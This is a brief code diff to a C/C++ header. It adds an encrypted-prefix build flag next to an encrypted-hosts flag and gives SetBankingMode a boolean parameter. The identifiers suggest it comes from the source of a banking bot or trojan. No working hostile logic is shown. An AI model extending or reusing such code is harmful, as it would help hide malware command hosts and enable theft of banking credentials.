@@ -53,9 +53,11 @@
 
 
 #ifndef DEBUGCONFIG
-	#define BOTPARAM_ENCRYPTED_HOSTS true
+	#define BOTPARAM_ENCRYPTED_HOSTS  true
+	#define BOTPARAM_ENCRYPTED_PREFIX true
 #else
-	#define BOTPARAM_ENCRYPTED_HOSTS false
+	#define BOTPARAM_ENCRYPTED_HOSTS  false
+	#define BOTPARAM_ENCRYPTED_PREFIX false
 #endif
 
 //--------------------------------------------------------
@@ -117,7 +119,7 @@ char *GetPrefix();
 
 
 
-void SetBankingMode();
+void SetBankingMode(bool IsBanking = true);
 
 
 //------------------------------------------------------------------------
